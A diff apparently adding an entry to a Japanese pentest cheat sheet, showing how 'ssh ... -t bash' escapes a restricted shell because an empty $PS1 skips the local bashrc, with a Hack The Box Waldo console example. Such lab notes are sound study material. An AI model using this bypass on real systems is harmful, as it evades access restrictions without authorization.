@@ -52,5 +52,18 @@
   hades@172.19.0.2's password:
   ```
 
+* Restricted shell bypass
+* ssh root@127.0.0.1 -t bashで制限シェルを回避可能
+* bashは/etc/bash.bashrcで$PS1が空でない時、ローカルのbashrcを読み込まない
+* ssh root@127.0.0.1 -t bashでは$PS1が空となるため、ローカルのbashrcに記述された制限を回避できる
+* Htb: Waldo
+
+  ```console
+  waldo:~/.ssh$ ssh  -i .monitor monitor@localhost 'echo $PS1'
+  
+  waldo:~/.ssh$ ssh  -i .monitor monitor@localhost  -t bash
+  monitor@waldo:~$
+  ```
+
   
 
